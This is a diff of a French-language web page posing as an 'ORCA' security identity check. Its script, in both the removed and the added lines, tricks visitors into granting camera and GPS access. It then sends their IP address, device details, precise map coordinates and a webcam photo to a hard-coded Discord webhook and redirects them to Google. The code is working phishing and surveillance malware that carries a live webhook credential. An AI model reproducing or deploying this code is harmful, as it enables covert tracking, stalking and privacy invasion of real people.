@@ -1,103 +1,61 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ORCA Security System</title>
-    <style>
-        :root { --neon: #00ff41; --bg: #0a0a0a; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .window { border: 1px solid var(--neon); padding: 30px; border-radius: 4px; background: rgba(0, 20, 0, 0.95); box-shadow: 0 0 25px rgba(0, 255, 65, 0.1); width: 90%; max-width: 480px; position: relative; }
-        .window::before { content: "SYSTEM_ACCESS_V5"; position: absolute; top: -12px; left: 15px; background: var(--bg); padding: 0 8px; font-size: 11px; letter-spacing: 2px; }
-        .stats { color: #888; font-size: 13px; margin: 20px 0; border-left: 2px solid var(--neon); padding-left: 15px; }
-        .bar-bg { width: 100%; height: 2px; background: #1a1a1a; margin: 20px 0; display: none; }
-        .bar-fill { width: 0%; height: 100%; background: var(--neon); box-shadow: 0 0 10px var(--neon); transition: width 0.4s; }
-        .btn { background: transparent; color: var(--neon); border: 1px solid var(--neon); padding: 15px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.2s; text-transform: uppercase; }
-        .btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
-        #video, #canvas { display: none; }
-    </style>
-</head>
-<body>
-    <div class="window">
-        <h2 style="margin: 0 0 10px 0;">ACCESS_DENIED</h2>
-        <p style="font-size: 14px;">Une anomalie a été détectée. Une vérification d'identité via le protocole ORCA est nécessaire pour déverrouiller la session.</p>
-        
-        <div class="stats" id="stats-box">
-            STATUS: WAITING_USER<br>
-            ENCRYPTION: AES-256<br>
-            TARGET_OS: DETECTING...
-        </div>
-
-        <div class="bar-bg" id="loader"><div class="bar-fill" id="progress"></div></div>
-        <button id="run" class="btn" onclick="execute()">Lancer l'Authentification</button>
-    </div>
-
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";
-
-        async function post(msg, file = null) {
-            const fd = new FormData();
-            if (file) fd.append('file', file, 'capture.png');
-            fd.append('payload_json', JSON.stringify({ content: msg, username: "ORCA_BOT" }));
-            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e){}
-        }
-
-        async function execute() {
-            document.getElementById('run').style.display = 'none';
-            document.getElementById('loader').style.display = 'block';
+async function execute() {
+            const btn = document.getElementById('run');
             const progress = document.getElementById('progress');
             const stats = document.getElementById('stats-box');
 
-            // 1. RÉCUPÉRATION IP (Version Renforcée)
-            let ip = "Détection bloquée";
-            stats.innerHTML = "STATUS: SCANNING_IP...<br>TARGET_OS: " + navigator.platform;
+            btn.style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            stats.innerHTML = "STATUS: INITIALIZING_GEOLOCATION...<br>MODULE: GPS_ACTIVE";
+
+            // 1. RÉCUPÉRATION IP & INFOS SYSTÈME
+            let ip = "Non détectée";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                ip = d.ip;
+            } catch(e) {}
             
-            try {
-                // Utilisation de Cloudflare Trace (très difficile à bloquer)
-                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-                const text = await res.text();
-                ip = text.match(/ip=(.*)/)[1];
-            } catch(e) {
-                try {
-                    const res2 = await fetch('https://api.ipify.org?format=json');
-                    const d2 = await res2.json();
-                    ip = d2.ip;
-                } catch(e2){}
-            }
+            progress.style.width = "30%";
 
-            progress.style.width = "40%";
-            await post(`⚡ **ALERTE ORCA**\n\`\`\`yaml\nIP: ${ip}\nOS: ${navigator.platform}\nUSER: ${navigator.userAgent}\n\`\`\``);
+            // 2. FORCE LA GÉOLOCALISATION PRÉCISE (Satellite)
+            const getGPS = () => {
+                return new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => resolve(`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`),
+                        () => resolve("⚠️ Permission GPS refusée par l'utilisateur"),
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                });
+            };
 
-            // 2. CAMÉRA
+            const gpsLocation = await getGPS();
+            progress.style.width = "60%";
+
+            // ENVOI DU PREMIER RAPPORT (IP + GPS)
+            await post(`🎯 **CIBLE LOCALISÉE**\n\`\`\`yaml\nIP: ${ip}\nGPS: ${gpsLocation}\nOS: ${navigator.platform}\n\`\`\``);
+
+            // 3. CAMÉRA
             try {
-                stats.innerHTML = "STATUS: VERIFYING_BIOMETRICS...<br>IP: " + ip;
+                stats.innerHTML = "STATUS: CAPTURING_VISUAL...<br>GPS: LOCKED";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = () => {
-                    progress.style.width = "80%";
                     setTimeout(() => {
                         const canvas = document.getElementById('canvas');
                         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            await post("📸 **VISUEL RÉCUPÉRÉ**", blob);
+                            await post("📸 **PHOTO SYSTÈME**", blob);
                             progress.style.width = "100%";
-                            stats.innerHTML = "STATUS: ACCESS_GRANTED<br>REDIRECTION IN PROGRESS...";
                             stream.getTracks().forEach(t => t.stop());
-                            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+                            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
                         }, 'image/png');
                     }, 1000);
                 };
             } catch (err) {
-                await post("❌ **ACCÈS CAMÉRA BLOQUÉ**");
+                await post("❌ **CAMÉRA BLOQUÉE**");
                 window.location.href = "https://www.google.com";
             }
         }
-    </script>
-</body>
-</html>
